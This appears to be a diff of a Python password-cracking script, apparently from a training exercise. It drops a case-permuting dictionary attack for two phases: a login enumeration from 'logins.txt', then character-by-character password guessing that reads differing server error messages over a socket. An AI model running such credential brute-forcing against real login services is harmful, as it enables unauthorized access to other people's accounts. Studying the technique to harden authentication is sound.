@@ -12,16 +12,21 @@ import socket
 # ╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═════╝░      ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 
 
-def get_pass():
-    with open('passwords.txt') as pass_file:
-        for line in pass_file:
+def get_login():
+    with open('logins.txt') as login_file:
+        for line in login_file:
             word = line.rstrip()
-            if word.isdigit():
-                yield word
-            else:
-                word_combinations = itertools.product(*([letter.lower(), letter.upper()] for letter in word))
-                for word in word_combinations:
-                    yield ''.join(word)
+            yield word
+
+
+def get_symbol():
+    numbers = [chr(i) for i in range(48, 58)]
+    big_letters = [chr(i) for i in range(65, 91)]
+    low_letters = [chr(i) for i in range(97, 123)]
+    while True:
+        my_iter = itertools.chain(numbers, big_letters, low_letters)
+        for i in my_iter:
+            yield i
 
 
 parser = argparse.ArgumentParser()
@@ -33,13 +38,30 @@ args = parser.parse_args()
 ip_address = args.host
 port = int(args.port)
 address = (ip_address, port)
-password = get_pass()
+login = get_login()
+symbol_in_pass = get_symbol()
 response = ""
 
 with socket.socket() as client_socket:
     client_socket.connect(address)
-    while response != "Connection success!":
-        data = next(password).encode()
-        client_socket.send(data)
+
+    while response != '{"result": "Exception happened during login"}':
+        current_login = next(login)
+        data = '{"login": "' + current_login + '", "password": ""}'
+        client_socket.send(data.encode())
+        response = client_socket.recv(1023).decode()
+
+    found_pass = " "
+    checked_symbol = next(symbol_in_pass)
+
+    while response != '{"result": "Connection success!"}':
+        data = '{"login": "' + current_login + '", "password": "' + found_pass + '"}'
+        client_socket.send(data.encode())
         response = client_socket.recv(1024).decode()
-    print(data.decode())
+        if response == '{"result": "Wrong password!"}':
+            checked_symbol = next(symbol_in_pass)
+            found_pass = found_pass[:-1] + checked_symbol
+        elif response == '{"result": "Exception happened during login"}':
+            found_pass += next(symbol_in_pass)
+
+    print(data)
